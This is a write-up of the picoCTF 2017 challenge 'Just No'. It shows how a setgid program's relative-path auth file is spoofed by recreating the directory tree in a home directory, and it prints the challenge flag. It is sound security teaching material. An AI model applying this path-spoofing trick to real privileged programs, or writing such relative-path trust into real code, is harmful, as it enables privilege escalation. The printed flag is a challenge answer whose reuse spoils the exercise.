## Just No [40 Points]

A program at /problems/276fc27f3ef921f0e2f0f75ba95c9e60 has access to a flag but refuses to share it. Can you convince it otherwise?

**Hints:**

- Check out the difference between relative and absolute paths and see if you can figure out how to use them to solve this challenge. Could you possibly spoof another auth file it looks at instead...?

**Solution:**

```
$ ssh shell2017.picoctf.com
$ cd /problems/276fc27f3ef921f0e2f0f75ba95c9e60

$ ls -al
total 64
drwxr-xr-x   2 root       root       4096 Mar 31 08:00 .
drwxr-x--x 573 root       root      36864 Apr 16 23:31 ..
-rw-r--r--   1 hacksports just-no_7     2 Mar 31 08:00 auth
-r--r-----   1 hacksports just-no_7    33 Mar 31 08:00 flag
-rwxr-sr-x   1 hacksports just-no_7  7800 Mar 31 08:00 justno
-rw-r--r--   1 hacksports just-no_7   838 Mar 31 08:00 justno.c

$ cat justno.c
$ cat auth
```

The auth file is read from a relative path
```
int main(int argc, char **argv){
  //access auth file in ../../../problems/276fc27f3ef921f0e2f0f75ba95c9e60
  FILE* authf = fopen("../../problems/276fc27f3ef921f0e2f0f75ba95c9e60/auth","r");
  if(authf == NULL){
    printf("could not find auth file in ../../problems/276fc27f3ef921f0e2f0f75ba95c9e60/\n");
    return 0;
  }
```

The flag file is read if the auth file does not contain "no"
```
if(strcmp(auth,"no")!=0){
  FILE* flagf;
  flagf = fopen("/problems/276fc27f3ef921f0e2f0f75ba95c9e60/flag","r");
  char flag[64];
  fgets(flag,64,flagf);
  printf("Oh. Well the auth file doesn't say no anymore so... Here's the flag: %s",flag);
  fclose(flagf);
}
```

Create fake auth file and execute justno
```
$ cd
$ mkdir problems
$ mkdir problems/276fc27f3ef921f0e2f0f75ba95c9e60
$ cd problems/276fc27f3ef921f0e2f0f75ba95c9e60
$ echo "yes" > auth
$ /problems/276fc27f3ef921f0e2f0f75ba95c9e60/justno
Oh. Well the auth file doesn't say no anymore so... Here's the flag: 8661ca23ef68adc41d407817b8656dd0
```

**Flag:** 8661ca23ef68adc41d407817b8656dd0
